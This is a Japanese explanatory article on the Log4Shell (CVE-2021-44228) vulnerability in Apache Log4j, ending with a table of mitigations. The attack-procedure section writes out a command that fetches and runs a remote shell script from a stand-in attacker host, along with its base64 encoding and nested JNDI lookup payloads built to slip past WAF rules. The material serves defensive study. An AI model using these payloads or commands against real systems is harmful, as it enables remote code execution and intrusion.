重大なサイバー攻撃の攻撃手順と対策について

Log4Shell (CVE-2021-44228)

  CVSS :  EPSS :

  • Apache Log4j 2 に存在した脆弱性
  • ログ出力対象の文字列に含まれる ${} 形式のLookup構文が、ログ出力時に評価・実行されてしまうことが原因
  • JNDI(Java Naming and Directory Interface)経由で LDAP や RMI などのプロトコルを使い、外部から任意の Java クラスをロード・実行させることでリモートコード実行(RCE)に繋がる
    • ${jndi:ldap://...}
    • ${jndi:rmi://...}
    • ${jndi:dns://...}
  • 攻撃者が制御可能な文字列(HTTPヘッダ、フォーム入力など)がログ出力される箇所であれば、任意の外部サーバへ接続させることが可能

攻撃手順

| 役割 | FQDN | 説明 | | --- | --- | --- | | 脆弱なアプリケーション | `example.zone` | Log4jを使用しており、外部入力をログ出力する処理を持つ | | 攻撃者のLDAPサーバ | `ldap.zone` | JNDI問い合わせを受け、Referenceオブジェクト(codebase URL)を返す | | 攻撃者のHTTP/Classサーバ | `download.zone` | LDAPのReferenceが指すJavaクラスファイルを配布する |

※[検索キー]は攻撃者が用意したLDAPサーバの仕様による

LDAPサーバがBASE64などでエンコードされたOSコマンドを実行できる場合 

wget -q -O- http://download.zone/attack.sh|bash
を実行させたい場合

シェルの特殊文字
  • |
  • 空白
等を正常に動かすため、BASE64等でエンコードする

ターミナル 
echo -n 'wget -q -O- http://download.zone/attack.sh|bash' | base64

base64

難読化によるフィルタ回避(WAFバイパス)

WAFルール回避 
${${lower:j}ndi:ldap://ldap.zone/[検索キー]}
${${upper:j}${lower:n}di:ldap://ldap.zone/[検索キー]}
${${::-j}${::-n}${::-d}${::-i}:ldap://ldap.zone/[検索キー]}

  • 最終的に ${jndi:ldap://ldap.zone/[検索キー]} と等価な文字列に解決されるため、ログ出力処理に渡った時点で元の攻撃と同じ挙動になる
  • Log4jの文字列置換処理(StrSubstitutor)は ${...} を内側から再帰的に評価する
    → 様々なパターンがあるため、WAFの単純な文字列マッチだけでは不十分
  • 根本対策 : Log4j自体の修正バージョンへの更新

攻撃と対策

| 攻撃要件 | 成功条件 | 対策 | | --- | --- | --- | | Javaのバージョン |
  • JNDIのリモートクラスロードがデフォルトで無効化される前のバージョン
  • `com.sun.jndi.ldap.object.trustURLCodebase` が `true` の環境
系列脆弱(デフォルト`true`)な範囲
Java 6**6u211 より前**
Java 7**7u201 より前**
Java 8**8u191 より前**
Java 11**11.0.1 より前**
|
  • JDK/JREを最新バージョンへアップデート
  • `trustURLCodebase` を `false` に明示的に設定
系列デフォルト`false`(対策済み)の範囲
Java 6**6u211 以降**
Java 7**7u201 以降**
Java 8**8u191 以降**
Java 11**11.0.1 以降**
| | ログ出力処理 | ログ出力処理する文字列中に攻撃文字列(`${jndi:ldap://...}`等)を含める |
  • Log4jを脆弱性修正済みバージョン(2.17.1以降等)へアップデート
  • 環境変数 `LOG4J_FORMAT_MSG_NO_LOOKUPS=true` を設定
  • JVM引数 `-Dlog4j2.formatMsgNoLookups=true` を設定(バージョンによる)
| | Log4jのライブラリ構成 | 脆弱なバージョンの `log4j-core` がクラスパス上に存在する |
  • `JndiLookup` クラスをjarから削除(暫定対応)
  • 利用中の全依存ライブラリ(SBOM)を棚卸しし、間接依存も含め脆弱バージョンを排除
| | ネットワーク到達性 | アプリケーションサーバから外部(攻撃者LDAP/HTTPサーバ)への通信が許可されている |
  • WAFで `${jndi:` 等のパターンを検知・遮断
    (ただし`${${lower:j}ndi:...}`等のネスト構文で回避されうるため**根本対策にはならない**点に注意)
  • アプリケーションサーバからの不要な外向き通信(アウトバウンド)をファイアウォールで制限
| | 入力文字列の経路 | ユーザ制御可能な入力(HTTPヘッダ、User-Agent、フォーム値等)がログに出力される |
  • ログ出力前に入力値のサニタイズ・エスケープを実施
  • 外部入力を直接ログメッセージに含めない設計にする
|
